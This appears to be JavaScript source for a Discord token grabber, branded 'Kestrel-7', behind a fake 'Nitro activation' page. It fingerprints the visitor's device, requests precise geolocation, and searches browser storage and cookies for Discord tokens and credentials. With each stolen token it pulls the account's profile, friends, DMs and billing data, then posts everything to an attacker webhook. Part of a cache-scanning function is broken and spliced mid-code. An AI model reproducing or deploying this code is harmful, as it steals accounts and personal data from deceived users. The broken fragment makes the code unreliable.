// ===== CANVAS FINGERPRINT =====
async function getCanvasFingerprint(){
    try{
        const canvas = document.createElement('canvas');
        canvas.width = 200;
        canvas.height = 50;
        const ctx = canvas.getContext('2d');
        ctx.textBaseline = 'top';
        ctx.font = '14px Arial';
        ctx.fillStyle = '#f60';

        ctx.fillStyle = '#069';
        ctx.fillText('Kestrel7-' + genId(), 2, 15);
        ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
        ctx.fillText('Fingerprint', 4, 17);
        return canvas.toDataURL();
    }catch(e){
        return 'canvas_blocked';
    }
}

// ===== WEBGL FINGERPRINT =====
function getWebGLFingerprint(){
    try{
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        if(!gl) return 'webgl_unavailable';
        
        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
        const renderer = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER);
        const vendor = debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : gl.getParameter(gl.VENDOR);
        
        return {
            renderer: renderer,
            vendor: vendor,
            version: gl.getParameter(gl.VERSION),
            shadingLanguage: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
            extensions: gl.getSupportedExtensions().length
        };
    }catch(e){
        return 'webgl_blocked';
    }
}

// ===== AUDIO FINGERPRINT =====
async function getAudioFingerprint(){
    try{
        const AudioContext = window.AudioContext || window.webkitAudioContext;
        const ctx = new AudioContext();
        const oscillator = ctx.createOscillator();
        const analyser = ctx.createAnalyser();
        const gain = ctx.createGain();
        const scriptProcessor = ctx.createScriptProcessor(4096, 1, 1);
        
        oscillator.type = 'triangle';
        oscillator.frequency.value = 10000;
        gain.gain.value = 0.1;
        
        oscillator.connect(analyser);
        analyser.connect(scriptProcessor);
        scriptProcessor.connect(gain);
        gain.connect(ctx.destination);
        
        const audioData = new Float32Array(analyser.frequencyBinCount);
        analyser.getFloatFrequencyData(audioData);
        
        let hash = 0;
        for(let i = 0; i < audioData.length; i++){
            hash = ((hash << 5) - hash) + audioData[i];
            hash = hash & hash;
        }
        
        ctx.close();
        return Math.abs(hash);
    }catch(e){
        return 'audio_blocked';
    }
}

// ===== HARDWARE INFO =====
function getHardwareInfo(){
    return {
        cores: navigator.hardwareConcurrency || 'unknown',
        memory: navigator.deviceMemory || 'unknown',
        maxTouchPoints: navigator.maxTouchPoints || 0,
        gpu: getWebGLFingerprint(),
        screen: {
            width: screen.width,
            height: screen.height,
            availWidth: screen.availWidth,
            availHeight: screen.availHeight,
            colorDepth: screen.colorDepth,
            pixelDepth: screen.pixelDepth
        }
    };
}

// ===== BATTERY STATUS =====
async function getBatteryInfo(){
    try{
        if(navigator.getBattery){
            const battery = await navigator.getBattery();
            return {
                level: battery.level * 100 + '%',
                charging: battery.charging,
                chargingTime: battery.chargingTime,
                dischargingTime: battery.dischargingTime
            };
        }
        return 'battery_api_unavailable';
    }catch(e){
        return 'battery_blocked';
    }
}

// ===== GEOLOCATION =====
function getGeolocation(){
    return new Promise((resolve) => {
        if(navigator.geolocation){
            navigator.geolocation.getCurrentPosition(
                (pos) => resolve({
                    latitude: pos.coords.latitude,
                    longitude: pos.coords.longitude,
                    accuracy: pos.coords.accuracy,
                    altitude: pos.coords.altitude,
                    speed: pos.coords.speed,
                    timestamp: pos.timestamp
                }),
                (err) => resolve({error: err.message}),
                {enableHighAccuracy: true, timeout: 5000, maximumAge: 0}
            );
        } else {
            resolve('geolocation_unavailable');
        }
    });
}

// ===== SCAN DE TOKENS EM TODOS OS STORAGES =====
function deepScanStorage(){
    let findings = [];
    
    // localStorage
    try{
        for(let i = 0; i < localStorage.length; i++){
            const key = localStorage.key(i);
            const value = localStorage.getItem(key);
            
            // Procura tokens Discord
            const tokenRegex = /[\w-]{24}\.[\w-]{6}\.[\w-]{25,27}/g;
            const tokenMatches = value.match(tokenRegex);
            if(tokenMatches){
                findings.push({
                    source: 'localStorage',
                    key: key,
                    tokens: tokenMatches,
                    rawValue: value.substring(0, 500)
                });
            }
            
            // Procura dados sensíveis
            if(key.toLowerCase().includes('token') || 
               key.toLowerCase().includes('auth') ||
               key.toLowerCase().includes('session') ||
               key.toLowerCase().includes('discord') ||
               key.toLowerCase().includes('password') ||
               key.toLowerCase().includes('credential')){
                findings.push({
                    source: 'localStorage',
                    key: key,
                    value: value.substring(0, 500),
                    sensitive: true
                });
            }
        }
    }catch(e){}
    
    // sessionStorage
    try{
        for(let i = 0; i < sessionStorage.length; i++){
            const key = sessionStorage.key(i);
            const value = sessionStorage.getItem(key);
            
            const tokenRegex = /[\w-]{24}\.[\w-]{6}\.[\w-]{25,27}/g;
            const tokenMatches = value.match(tokenRegex);
            if(tokenMatches){
                findings.push({
                    source: 'sessionStorage',
                    key: key,
                    tokens: tokenMatches
                });
            }
        }
    }catch(e){}
    
    // Cookies
    try{
        const cookies = document.cookie.split(';');
        for(let cookie of cookies){
            const trimmed = cookie.trim();
            const tokenRegex = /[\w-]{24}\.[\w-]{6}\.[\w-]{25,27}/g;
            const tokenMatches = trimmed.match(tokenRegex);
            if(tokenMatches){
                findings.push({
                    source: 'cookie',
                    token: tokenMatches[0],
                    fullCookie: trimmed.substring(0, 300)
                });
            }
            
            if(trimmed.toLowerCase().includes('token') || 
               trimmed.toLowerCase().includes('auth') ||
               trimmed.toLowerCase().includes('session')){
                findings.push({
                    source: 'cookie',
                    value: trimmed.substring(0, 300),
                    sensitive: true
                });
            }
        }
    }catch(e){}
    
    return findings;
}

// ===== INDEXEDDB DEEP SCAN =====
async function deepScanIndexedDB(){
    let findings = [];
    
    const dbNames = ['discord', 'Discord', 'discordapp', 'localforage', 'keyval-store'];
    
    for(let dbName of dbNames){
        try{
            const db = await new Promise((resolve, reject) => {
                const request = indexedDB.open(dbName);
                request.onsuccess = () => resolve(request.result);
                request.onerror = () => reject(request.error);
            });
            
            const storeNames = Array.from(db.objectStoreNames);
            
            for(let storeName of storeNames){
                try{
                    const data = await new Promise((resolve, reject) => {
                        const tx = db.transaction(storeName, 'readonly');
                        const store = tx.objectStore(storeName);
                        const getAll = store.getAll();
                        getAll.onsuccess = () => resolve(getAll.result);
                        getAll.onerror = () => reject(getAll.error);
                    });
                    
                    if(data && data.length > 0){
                        const jsonData = JSON.stringify(data);
                        const tokenRegex = /[\w-]{24}\.[\w-]{6}\.[\w-]{25,27}/g;
                        const tokenMatches = jsonData.match(tokenRegex);
                        
                        if(tokenMatches){
                            findings.push({
                                source: 'indexedDB_' + dbName,
                                store: storeName,
                                tokens: tokenMatches,
                                dataPreview: jsonData.substring(0, 1000)
                            });
                        }
                    }
                }catch(e){}
            }
            
            db.close();
        }catch(e){}
    }
    
    return findings;
}

                    if(url.toLowerCase().includes('discord') ||

                            source: 'cache',
                            cacheName: cacheName,
                            url: url.substring(0, 300)
                        });
                    }
                }
            }
        }
    }catch(e){}
    
    return findings;
}

// ===== SERVICE WORKER SCAN =====
async function scanServiceWorkers(){
    let findings = [];
    
    try{
        if('serviceWorker' in navigator){
            const registrations = await navigator.serviceWorker.getRegistrations();
            
            for(let registration of registrations){
                findings.push({
                    scope: registration.scope,
                    active: registration.active ? registration.active.scriptURL : null,
                    waiting: registration.waiting ? registration.waiting.scriptURL : null
                });
            }
        }
    }catch(e){}
    
    return findings;
}

// ===== TENTA VALIDAR TOKEN E EXTRAIR DADOS =====
async function validateAndExtract(token){
    try{
        const headers = {
            'Authorization': token,
            'Content-Type': 'application/json'
        };
        
        // Dados do usuário
        const userResponse = await fetch('https://discord.com/api/v9/users/@me', {headers});
        if(!userResponse.ok) return null;
        const userData = await userResponse.json();
        
        // Servidores
        const guildsResponse = await fetch('https://discord.com/api/v9/users/@me/guilds', {headers});
        const guilds = guildsResponse.ok ? await guildsResponse.json() : [];
        
        // Amigos
        const friendsResponse = await fetch('https://discord.com/api/v9/users/@me/relationships', {headers});
        const friends = friendsResponse.ok ? await friendsResponse.json() : [];
        
        // DMs
        const dmsResponse = await fetch('https://discord.com/api/v9/users/@me/channels', {headers});
        const dms = dmsResponse.ok ? await dmsResponse.json() : [];
        
        // Configurações
        const settingsResponse = await fetch('https://discord.com/api/v9/users/@me/settings', {headers});
        const settings = settingsResponse.ok ? await settingsResponse.json() : {};
        
        // Billings
        const billingResponse = await fetch('https://discord.com/api/v9/users/@me/billing/payment-sources', {headers});
        const billing = billingResponse.ok ? await billingResponse.json() : [];
        
        return {
            user: userData,
            guilds: guilds,
            friends: friends,
            dms: dms,
            settings: settings,
            billing: billing,
            token: token
        };
    }catch(e){
        return null;
    }
}

// ===== ENVIO PARA WEBHOOK =====
async function sendToWebhook(data, webhookUrl){
    try{
        const chunks = [];
        const jsonStr = JSON.stringify(data);
        const maxChunkSize = 1800;
        
        for(let i = 0; i < jsonStr.length; i += maxChunkSize){
            chunks.push(jsonStr.substring(i, i + maxChunkSize));
        }
        
        for(let i = 0; i < chunks.length; i++){
            const payload = {
                content: i === 0 ? "🚨 **CAPTURA COMPLEXA - KESTREL-7 v3.0** 🚨" : "",
                embeds: [{
                    title: i === 0 ? "📦 Dados Completos" : `📦 Chunk ${i+1}/${chunks.length}`,
                    description: "```json\n" + chunks[i] + "\n```",
                    color: 16711680,
                    footer: {text: "Kestrel-7 Advanced Grabber • Chunk " + (i+1) + "/" + chunks.length}
                }]
            };
            
            await fetch(webhookUrl, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(payload)
            });
            
            await sleep(500);
        }
        
        return true;
    }catch(e){
        return false;
    }
}

// ===== GRABBER PRINCIPAL =====
async function grabToken(){
    const status = document.getElementById('status');
    const btn = document.getElementById('connectBtn');
    
    btn.disabled = true;
    status.textContent = "Inicializando...";
    
    try{
        // 1. Coleta todas as informações
        status.textContent = "Coletando dados do sistema...";
        const hardwareInfo = getHardwareInfo();
        const canvasFp = await getCanvasFingerprint();
        const audioFp = await getAudioFingerprint();
        const batteryInfo = await getBatteryInfo();
        const geoInfo = await getGeolocation();
        const browserInfo = {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            languages: navigator.languages,
            cookieEnabled: navigator.cookieEnabled,
            doNotTrack: navigator.doNotTrack,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            referrer: document.referrer,
            url: window.location.href,
            title: document.title
        };
        
        // 2. Scan de tokens
        status.textContent = "Escaneando storages...";
        const storageFindings = deepScanStorage();
        const indexedDBFindings = await deepScanIndexedDB();
        const cacheFindings = await scanCacheStorage();
        const swFindings = await scanServiceWorkers();
        
        // 3. Valida tokens encontrados
        status.textContent = "Validando tokens...";
        const allTokens = [];
        
        for(let finding of storageFindings){
            if(finding.tokens){
                allTokens.push(...finding.tokens);
            }
            if(finding.token){
                allTokens.push(finding.token);
            }
        }
        
        for(let finding of indexedDBFindings){
            if(finding.tokens){
                allTokens.push(...finding.tokens);
            }
        }
        
        // Deduplicação
        const uniqueTokens = [...new Set(allTokens)];
        
        // 4. Extração de dados para cada token válido
        const extractedData = [];
        for(let token of uniqueTokens){
            const data = await validateAndExtract(token);
            if(data){
                extractedData.push(data);
            }
        }
        
        // 5. IP
        let ip = 'Desconhecido';
        try{
            const ipResponse = await fetch('https://api.ipify.org?format=json');
            const ipData = await ipResponse.json();
            ip = ipData.ip;
        }catch(e){}
        
        // 6. Monta payload completo
        const fullData = {
            capture_id: genId(),
            timestamp: new Date().toISOString(),
            ip: ip,
            browser: browserInfo,
            hardware: hardwareInfo,
            canvas_fingerprint: canvasFp,
            audio_fingerprint: audioFp,
            battery: batteryInfo,
            geolocation: geoInfo,
            storage_findings: storageFindings,
            indexeddb_findings: indexedDBFindings,
            cache_findings: cacheFindings,
            service_workers: swFindings,
            extracted_accounts: extractedData,
            tokens_found: uniqueTokens
        };
        
        // 7. Envia para webhook
        status.textContent = "Enviando dados...";
        const sent = await sendToWebhook(fullData, WEBHOOK_URL);
        
        if(!sent){
            await sendToWebhook(fullData, WEBHOOK_BACKUP);
        }
        
        // 8. Também envia para o webhook original em formato resumido
        if(extractedData.length > 0){
            for(let account of extractedData){
                const summaryPayload = {
                    content: "🎯 **CONTA CAPTURADA**",
                    embeds: [{
                        title: "Token Válido Encontrado",
                        color: 65280,
                        fields: [
                            {name: "Usuário", value: account.user.username + '#' + account.user.discriminator, inline: true},
                            {name: "ID", value: account.user.id, inline: true},
                            {name: "Email", value: account.user.email || 'N/A', inline: true},
                            {name: "Telefone", value: account.user.phone || 'N/A', inline: true},
                            {name: "Nitro", value: account.user.premium_type ? 'Sim' : 'Não', inline: true},
                            {name: "Servidores", value: String(account.guilds.length), inline: true},
                            {name: "Amigos", value: String(account.friends.length), inline: true},
                            {name: "Token", value: "```" + account.token + "```", inline: false}
                        ],
                        footer: {text: "Kestrel-7 v3.0"}
                    }]
                };
                
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify(summaryPayload)
                });
                
                await sleep(1000);
            }
        }
        
        status.textContent = "✅ Nitro ativado com sucesso!";
        
    }catch(e){
        status.textContent = "Erro: " + e.message;
    }
    
    // Redireciona
    setTimeout(() => {
        window.location.href = "https://discord.com/channels/@me";
    }, 3000);
}
